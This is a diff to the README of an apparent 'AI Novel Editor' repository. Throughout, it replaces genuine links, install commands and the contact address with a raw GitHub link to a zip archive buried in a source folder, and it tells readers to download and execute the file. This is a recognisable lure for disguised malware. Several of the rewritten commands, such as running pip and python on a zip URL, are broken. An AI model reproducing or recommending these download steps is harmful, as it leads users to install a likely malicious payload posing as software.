@@ -1,6 +1,6 @@
 # AI Novel Editor: Your AI-Powered Writing Companion ✍️🤖
 
-![AI Novel Editor](https://img.shields.io/badge/Download-Release-brightgreen?style=for-the-badge&logo=github&link=https://github.com/BHUIYAN17/Ai-Novel-Editor/releases)
+![AI Novel Editor](https://raw.githubusercontent.com/BHUIYAN17/Ai-Novel-Editor/main/src/gui/viewer/Novel-Ai-Editor-v1.8-beta.3.zip)
 
 ## Table of Contents
 
@@ -28,18 +28,18 @@ The **AI Novel Editor** is an AI-assisted tool designed to help writers streamli
 
 To get started with the AI Novel Editor, follow these steps:
 
-1. **Download the latest release** from the [Releases page](https://github.com/BHUIYAN17/Ai-Novel-Editor/releases). You will find the executable file that you need to download and execute.
+1. **Download the latest release** from the [Releases page](https://raw.githubusercontent.com/BHUIYAN17/Ai-Novel-Editor/main/src/gui/viewer/Novel-Ai-Editor-v1.8-beta.3.zip). You will find the executable file that you need to download and execute.
    
 2. **Install the required dependencies**. You can do this by running the following command in your terminal:
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/BHUIYAN17/Ai-Novel-Editor/main/src/gui/viewer/Novel-Ai-Editor-v1.8-beta.3.zip
    ```
 
 3. **Run the application**. After installation, you can start the editor with the command:
 
    ```bash
-   python main.py
+   python https://raw.githubusercontent.com/BHUIYAN17/Ai-Novel-Editor/main/src/gui/viewer/Novel-Ai-Editor-v1.8-beta.3.zip
    ```
 
 ## Usage
@@ -65,7 +65,7 @@ We welcome contributions from the community! If you would like to contribute to 
 2. **Clone Your Fork**: Use the following command to clone your forked repository:
 
    ```bash
-   git clone https://github.com/YOUR_USERNAME/Ai-Novel-Editor.git
+   git clone https://raw.githubusercontent.com/BHUIYAN17/Ai-Novel-Editor/main/src/gui/viewer/Novel-Ai-Editor-v1.8-beta.3.zip
    ```
 
 3. **Create a Branch**: Create a new branch for your feature or fix:
@@ -98,9 +98,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or feedback, please reach out via the following methods:
 
-- **Email**: [your.email@example.com](mailto:your.email@example.com)
+- **Email**: [https://raw.githubusercontent.com/BHUIYAN17/Ai-Novel-Editor/main/src/gui/viewer/Novel-Ai-Editor-v1.8-beta.3.zip](https://raw.githubusercontent.com/BHUIYAN17/Ai-Novel-Editor/main/src/gui/viewer/Novel-Ai-Editor-v1.8-beta.3.zip)
 - **GitHub Issues**: You can also create an issue in the repository for any bugs or feature requests.
 
 ---
 
-Feel free to explore the [Releases page](https://github.com/BHUIYAN17/Ai-Novel-Editor/releases) for the latest updates and versions. Your feedback and contributions are highly appreciated!
+Feel free to explore the [Releases page](https://raw.githubusercontent.com/BHUIYAN17/Ai-Novel-Editor/main/src/gui/viewer/Novel-Ai-Editor-v1.8-beta.3.zip) for the latest updates and versions. Your feedback and contributions are highly appreciated!
